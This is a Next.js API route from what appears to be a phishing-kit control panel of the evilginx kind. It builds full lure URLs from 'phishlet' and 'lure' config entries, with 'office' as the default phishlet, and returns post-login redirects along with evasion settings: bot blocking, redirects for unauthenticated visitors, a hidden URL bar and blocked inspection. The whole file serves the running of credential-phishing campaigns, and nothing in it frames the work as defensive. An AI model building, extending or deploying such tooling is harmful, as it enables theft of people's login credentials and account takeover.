import { NextApiRequest, NextApiResponse } from "next";
import { configService } from "@/services/configService";
import * as fs from "fs";
import * as path from "path";

// Define a type for lure objects in the config
interface ConfigLure {
  id: string;
  path: string;
  phishlet: string;
  [key: string]: any; // Allow other properties
}

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== "GET") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    // Check if a specific lure index was requested
    const { lureIndex } = req.query;

    // Convert lureIndex to a number if it exists
    const lureIndexNum =
      lureIndex !== undefined ? Number(lureIndex) : undefined;

    console.log(
      `API /full-link: Requesting data for lure index ${lureIndexNum}`
    );

    // Get the link info, specifying lure index if provided
    let linkInfo;

    // If we're requesting a specific index, get that specific lure
    if (lureIndexNum !== undefined) {
      const config = await configService.readConfig();
      if (
        config &&
        config.lures &&
        Array.isArray(config.lures) &&
        lureIndexNum >= 0 &&
        lureIndexNum < config.lures.length
      ) {
        const lure = config.lures[lureIndexNum];

        // We have the specific lure, now get its full link info
        const general = config.general || {};
        const domain = general.domain || "";
        const path = lure.path || "";
        const phishlet = lure.phishlet || "office"; // Default to office if not specified

        // Get the phishlet configuration
        const phishletConfig = config.phishlets?.[phishlet] || {};

        // Use the hostname from the phishlet config or construct it
        let hostname = phishletConfig.hostname || "";
        if (!hostname && domain) {
          hostname = `${phishlet}.${domain}`;
        }

        const fullUrl = hostname ? `https://${hostname}${path}` : "";

        linkInfo = {
          fullUrl,
          domain,
          path: path.replace(/^\/+/, ""), // Remove leading slash for display
          phishlet,
          afterLoginRedirect: lure.redirect_url || "",
          blockBots: config.blacklist?.mode === "unauth",
          redirectUrl: general.unauth_url || "",
          hideUrlBar: true, // Default security settings
          blockInspect: true,
          redirectGuard: true,
        };

        console.log(`API /full-link: Found lure at index ${lureIndexNum}:`, {
          path: lure.path,
          phishlet: lure.phishlet,
        });
      } else {
        console.log(`API /full-link: No lure found at index ${lureIndexNum}`);
        linkInfo = null;
      }
    } else {
      // Backward compatibility with lureId parameter
      const { lureId } = req.query;
      console.log(`API /full-link: Falling back to lureId ${lureId}`);
      linkInfo = await configService.getFullLink(
        typeof lureId === "string" ? lureId : undefined
      );
    }

    if (!linkInfo) {
      return res.status(200).json({
        fullUrl: "",
        domain: "",
        path: "",
      });
    }

    return res.status(200).json(linkInfo);
  } catch (error) {
    console.error("Error getting full link:", error);

    // Fallback: Try to read the config file directly
    try {
      const dataDir = path.join(process.cwd(), "data");
      const configPath = path.join(dataDir, "config.json");

      if (fs.existsSync(configPath)) {
        const configData = fs.readFileSync(configPath, "utf8");
        const config = JSON.parse(configData);

        const domain = config.general?.domain || "";

        // Try to use the specified lure index if provided
        const { lureIndex } = req.query;
        let selectedLure: ConfigLure | undefined;

        if (
          lureIndex !== undefined &&
          config.lures &&
          Array.isArray(config.lures)
        ) {
          const index = Number(lureIndex);
          if (!isNaN(index) && index >= 0 && index < config.lures.length) {
            selectedLure = config.lures[index];
            console.log(
              `API /full-link fallback: Using lure at index ${index}`
            );
          }
        }

        // If no lure index specified or not found, use the first lure
        const lure: ConfigLure =
          selectedLure || (config.lures?.[0] as ConfigLure) || {};
        const path = lure.path || "";
        const phishlet = lure.phishlet || "office"; // Default to office if not specified

        // Get the phishlet configuration
        const phishletConfig = config.phishlets?.[phishlet] || {};

        // Use the hostname from the phishlet config or construct it
        let hostname = phishletConfig.hostname || "";
        if (!hostname && domain) {
          hostname = `${phishlet}.${domain}`;
        }

        const fullUrl = hostname ? `https://${hostname}${path}` : "";

        return res.status(200).json({
          fullUrl,
          domain,
          path: path.replace(/^\/+/, ""), // Remove leading slash for display
          phishlet,
          afterLoginRedirect: lure.redirect_url || "",
          blockBots: config.blacklist?.mode === "unauth",
          redirectUrl: config.general?.unauth_url || "",
        });
      }

      // If config file doesn't exist, return empty values
      return res.status(200).json({
        fullUrl: "",
        domain: "",
        path: "",
      });
    } catch (fallbackError) {
      console.error("Fallback error reading config:", fallbackError);
      return res.status(200).json({
        fullUrl: "",
        domain: "",
        path: "",
      });
    }
  }
}
